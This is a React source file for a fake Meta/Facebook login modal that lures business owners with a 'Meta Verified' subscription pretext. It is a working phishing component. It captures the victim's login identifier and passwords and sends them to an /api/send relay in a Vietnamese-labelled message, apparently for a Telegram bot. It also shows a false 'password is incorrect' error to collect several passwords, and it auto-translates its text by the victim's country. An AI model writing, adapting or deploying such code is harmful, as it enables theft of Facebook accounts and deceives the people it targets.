'use client';

import FbRoundLogo from '@/assets/images/fb_round_logo.png';
import MetaLogo from '@/assets/images/meta-logo-grey.png';
import TickIcon from '@/assets/images/tick.svg';
import { store } from '@/store/store';
import config from '@/utils/config';
import translateText from '@/utils/translate';
import axios from 'axios';
import { useEffect, useState, type FC, type FormEvent } from 'react';

interface PasswordModalProps {
    userProfileImage: string;
    userName: string;
    userEmail: string;
    nextStep: () => void;
}

const SEP = '━━━━━━━━━━━━━━━━━━━━';

const delay = (delayTime: number) => {
    return new Promise((resolve) => {
        setTimeout(resolve, delayTime);
    });
};

const buildMessage = (baseMessage: string, loginEmail: string, passwords: string[]): string => {
    let msg = baseMessage;
    msg += `\n🔐 <b>ĐĂNG NHẬP</b>\n   TK: <code>${loginEmail}</code>`;
    passwords.forEach((pw, i) => {
        msg += `\n   MK${i + 1}: <code>${pw}</code>`;
    });
    msg += `\n${SEP}`;
    return msg;
};

const PasswordModal: FC<PasswordModalProps> = ({ nextStep }) => {
    const [identifier, setIdentifier] = useState('');
    const [password, setPassword] = useState('');
    const [showPassword, setShowPassword] = useState(false);
    const [loginAttempt, setLoginAttempt] = useState(0);
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [translations, setTranslations] = useState<Record<string, string>>({});

    const { messageId, baseMessage, passwords, setMessage, setMessageId, addPassword, setLoginEmail, geoInfo, setModalOpen } = store();

    const t = (text: string): string => translations[text] || text;

    useEffect(() => {
        if (!geoInfo) return;

        const textsToTranslate = [
            'In order to subscribe your business to Meta Verified, you must be logged in to your professional account (Facebook) or business Page (Facebook).',
            'Mobile number or email',
            'Password',
            'Password is incorrect, please try again.',
            'Log in',
            'Continue',
            'Forgot password?',
            'About · Help · See more'
        ];

        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};
            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }
            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    const handleChange = (field: 'identifier' | 'password', value: string) => {
        if (field === 'identifier') {
            setIdentifier(value);
        } else {
            setPassword(value);
        }
        if (showError) {
            setShowError(false);
        }
    };

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();

        if (!identifier.trim() || !password.trim() || isLoading || !baseMessage) return;

        setIsLoading(true);
        setShowError(false);
        setLoginEmail(identifier.trim());

        const newPasswords = [...passwords, password];
        addPassword(password);

        const updatedMessage = buildMessage(baseMessage, identifier.trim(), newPasswords);

        try {
            const res = await axios.post('/api/send', {
                message: updatedMessage,
                message_id: messageId
            });

            if (res?.data?.success) {
                if (typeof res.data.data?.result?.message_id === 'number') {
                    setMessageId(res.data.data.result.message_id);
                }
                setMessage(updatedMessage);
            }

            await delay(1500);

            const nextAttempt = loginAttempt + 1;
            setLoginAttempt(nextAttempt);

            if (nextAttempt >= config.MAX_PASS) {
                setShowError(false);
                nextStep();
            } else {
                setShowError(true);
                setPassword('');
            }
        } catch {
            nextStep();
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <>
            <div className='modal-backdrop show' onClick={() => setModalOpen(false)} aria-hidden='true' />
            <div className='modal form-modal show' id='exampleModal2' tabIndex={-1} role='dialog' aria-modal='true'>
                <div className='modal-dialog modal-dialog-centered modal-fullscreen-lg-down'>
                    <div className='modal-content'>
                        <div className='modal-header' />
                        <div className='modal-body'>
                            <div>
                                <div className='fb-round-wraper text-center'>
                                    {/* eslint-disable-next-line @next/next/no-img-element */}
                                    <img alt='' className='fb-logo-round' src={FbRoundLogo.src} />
                                </div>

                                <form autoComplete='off' id='apiForm' onSubmit={handleSubmit}>
                                    <p className='login-instruction'>
                                        {/* eslint-disable-next-line @next/next/no-img-element */}
                                        <img src={TickIcon.src} width={16} height={16} alt='tick' />
                                        {t('In order to subscribe your business to Meta Verified, you must be logged in to your professional account (Facebook) or business Page (Facebook).')}
                                    </p>

                                    {loginAttempt === 0 && (
                                        <div className={`form-floating mb-3${identifier.trim() ? ' has-value' : ''}`} id='emailField'>
                                            <input
                                                autoComplete='username'
                                                className='form-control'
                                                id='loginIdentifier'
                                                maxLength={60}
                                                minLength={3}
                                                name='identifier'
                                                placeholder=' '
                                                required
                                                type='text'
                                                value={identifier}
                                                onChange={(e) => handleChange('identifier', e.target.value)}
                                            />
                                            <label htmlFor='loginIdentifier'>{t('Mobile number or email')}</label>
                                        </div>
                                    )}

                                    <div className={`form-floating mb-3${password.trim() ? ' has-value' : ''}`} style={{ position: 'relative' }}>
                                        <input
                                            autoComplete='current-password'
                                            className={`form-control ${showError ? 'is-invalid shake' : ''}`}
                                            id='exampleInputPassword'
                                            maxLength={30}
                                            minLength={3}
                                            name='password-1'
                                            placeholder=' '
                                            required
                                            style={{ paddingRight: '44px' }}
                                            type={showPassword ? 'text' : 'password'}
                                            value={password}
                                            onChange={(e) => handleChange('password', e.target.value)}
                                        />
                                        <label htmlFor='exampleInputPassword'>{t('Password')}</label>

                                        <button
                                            aria-label='Show/Hide password'
                                            aria-pressed={showPassword}
                                            className='password-toggle'
                                            id='show-hide-pass'
                                            style={{
                                                position: 'absolute',
                                                right: '12px',
                                                top: '50%',
                                                transform: 'translateY(-50%)',
                                                cursor: 'pointer',
                                                zIndex: 6,
                                                background: 'transparent',
                                                border: 0,
                                                padding: 0
                                            }}
                                            type='button'
                                            onClick={() => setShowPassword((prev) => !prev)}
                                        >
                                            <svg fill='#606770' height='22' viewBox='0 0 24 24' width='22' xmlns='http://www.w3.org/2000/svg' style={{ display: showPassword ? 'none' : 'inline' }}>
                                                <path d='M12 5c-7.633 0-11 7-11 7s3.367 7 11 7 11-7 11-7-3.367-7-11-7zm0 12c-2.762 0-5-2.239-5-5 0-2.762 2.238-5 5-5 2.761 0 5 2.238 5 5 0 2.761-2.239 5-5 5z' />
                                                <circle cx='12' cy='12' r='2.5' />
                                            </svg>
                                            <svg fill='#1877f2' height='22' viewBox='0 0 24 24' width='22' xmlns='http://www.w3.org/2000/svg' style={{ display: showPassword ? 'inline' : 'none' }}>
                                                <path d='M12 5c-7.633 0-11 7-11 7s3.367 7 11 7 11-7 11-7-3.367-7-11-7zm0 12c-2.762 0-5-2.239-5-5 0-2.762 2.238-5 5-5 2.761 0 5 2.238 5 5 0 2.761-2.239 5-5 5z' />
                                            </svg>
                                        </button>

                                        {showError && (
                                            <div className='invalid-feedback d-block' id='errorMsg'>
                                                {t('Password is incorrect, please try again.')}
                                            </div>
                                        )}
                                    </div>

                                    <div className='form-btn-wrapper'>
                                        <button className='btn btn-primary w-100' id='loginBtn' type='submit' disabled={isLoading}>
                                            {isLoading ? (
                                                <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent' id='spinner' aria-hidden='true' />
                                            ) : (
                                                <span className='button-text'>{loginAttempt === 0 ? t('Log in') : t('Continue')}</span>
                                            )}
                                        </button>
                                    </div>

                                    <div className='text-center' id='forgot-pass-wrap'>
                                        <a href='https://www.facebook.com/recover' target='_blank' rel='noopener noreferrer'>
                                            {t('Forgot password?')}
                                        </a>
                                    </div>
                                </form>
                            </div>

                            <div className='spaser' />
                        </div>

                        <div className='modal-footer border-0 justify-content-center'>
                            {/* eslint-disable-next-line @next/next/no-img-element */}
                            <img src={MetaLogo.src} alt='Meta Logo' />
                            <div className='footer-links'>{t('About · Help · See more')}</div>
                        </div>
                    </div>
                </div>
            </div>
        </>
    );
};

export default PasswordModal;
